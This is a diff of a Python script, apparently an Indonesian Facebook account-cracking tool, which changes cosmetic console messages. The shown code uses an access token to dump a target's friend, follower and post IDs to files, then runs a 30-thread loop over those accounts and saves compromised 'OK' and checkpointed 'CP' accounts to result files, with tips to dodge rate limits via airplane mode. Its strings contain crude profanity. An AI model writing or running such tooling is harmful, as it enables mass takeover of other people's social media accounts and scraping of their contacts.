@@ -122,8 +122,8 @@ def publik(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s╔═[%s•%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
-        idt = raw_input('╠═[?] Target id : %s'%(K))
+    	print ("\n%s╔══[%s•%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
+        idt = raw_input('╠══[?] Target id : %s'%(K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
@@ -133,15 +133,15 @@ def publik(romz,headers=header):
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s╚═[•] mohon sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s╚══[•] mohon sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         bff.close()
-        print ('\n \n%s╔═[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
-        print ('%s╠═[%s•%s] Salin file dump nya :%s %s '%(P,H,P,H,file))
-        raw_input('\n%s╚═[ %Enter %s] '%(P,K,P))
+        print ('\n \n%s╔══[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
+        print ('%s╚══[%s•%s] Salin file dump nya :%s %s '%(P,H,P,H,file))
+        raw_input('%s╚══[ %Enter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('\n%s╚═[•] dump selesai tod...'%(P))
+        exit('\n%s[✓] Dump Selesai Ngab'%(P))
 # DUMP FOLLOWERS
 def followers(romz,headers=header):
     try:
@@ -168,7 +168,7 @@ def followers(romz,headers=header):
         raw_input('%s╚══[ %sEnter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('%s\n╚══[•] dump selesai tod...'%(P))
+        exit('\n%s[✓] Dump Selesai Ngab'%(P))
 # DUMP POSTINGAN
 def postingan(romz,headers=header):
     try:
@@ -194,7 +194,7 @@ def postingan(romz,headers=header):
         raw_input('\n%s╚══[ %sEnter %s] '%(P,K,P))
         menu()
     except Exception as e:
-        exit('%s\n╚══[•] dump selesai tod...'%(P))
+        exit('\n%s[✓] Dump Selesai Ngab'%(P))
 # MULAI NGECROT AWOKAWOK NGENTOD
 class ngentod:
 
@@ -224,9 +224,9 @@ class ngentod:
                         if ind == '':
                             print("%s╚══[•] Isi yang benar kentod ] "%(M));self.zona()
                         elif ind in ('1', '01'):
-                            print '\n%s╔══[%s+%s] akun %sOK%s saved in >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
-                            print '%s╠══[%s+%s] akun %sCP %s saved in > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
-                            print '%s╚══[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.3)
+                            print '\n%s╔══[%s•%s] akun %sOK%s saved in >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
+                            print '%s╠══[%s•%s] akun %sCP %s saved in > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
+                            print '%s╚══[%s!%s] jika tidak ada hasil mode pesawatan (3 detik)\n'%(P,M,P);jeda(0.3)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -235,9 +235,9 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('2', '02'):
-                            print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
-                            print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
-                            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.3)
+                            print '\n%s╔══[%s•%s] akun %sOK%s saved in >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
+                            print '%s╠══[%s•%s] akun %sCP %s saved in > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
+                            print '%s╚══[%s!%s] jika tidak ada hasil mode pesawatan (3 detik)\n'%(P,M,P);jeda(0.3)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -246,9 +246,9 @@ class ngentod:
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('3', '03'):
-                            print '\n%s╔═[%s+%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
-                            print '%s╠═[%s+%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
-                            print '%s╚═[%s!%s] Jika tidak ada hasil gunakan mode pesawat (5 detik)\n'%(P,M,P);jeda(0.3)
+                            print '\n%s╔══[%s•%s] akun %sOK%s saved in >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.3)
+                            print '%s╠══[%s•%s] akun %sCP %s saved in > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.3)
+                            print '%s╚══[%s!%s] jika tidak ada hasil mode pesawatan (3 detik)\n'%(P,M,P);jeda(0.3)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
